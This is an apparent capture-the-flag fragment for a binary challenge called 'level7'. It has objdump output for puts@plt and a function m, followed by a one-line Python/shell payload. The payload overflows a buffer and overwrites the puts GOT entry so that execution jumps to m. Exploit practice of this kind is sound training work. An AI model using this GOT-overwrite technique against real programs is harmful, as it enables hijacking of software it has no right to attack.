```
08048400 <puts@plt>:
 8048400:	ff 25 28 99 04 08    	jmp    *0x8049928
 8048406:	68 28 00 00 00       	push   $0x28
 804840b:	e9 90 ff ff ff       	jmp    80483a0 <_init+0x34>

 080484f4 <m>:
 80484f4:	55                   	push   %ebp
 80484f5:	89 e5                	mov    %esp,%ebp
 80484f7:	83 ec 18             	sub    $0x18,%esp
 80484fa:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048501:	e8 ca fe ff ff       	call   80483d0 <time@plt>
 8048506:	ba e0 86 04 08       	mov    $0x80486e0,%edx
 804850b:	89 44 24 08          	mov    %eax,0x8(%esp)
 804850f:	c7 44 24 04 60 99 04 	movl   $0x8049960,0x4(%esp)
 8048516:	08 
 8048517:	89 14 24             	mov    %edx,(%esp)
 804851a:	e8 91 fe ff ff       	call   80483b0 <printf@plt>
 804851f:	c9                   	leave  
 8048520:	c3                   	ret  
```


```sh
./level7 $(python -c 'print "F" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

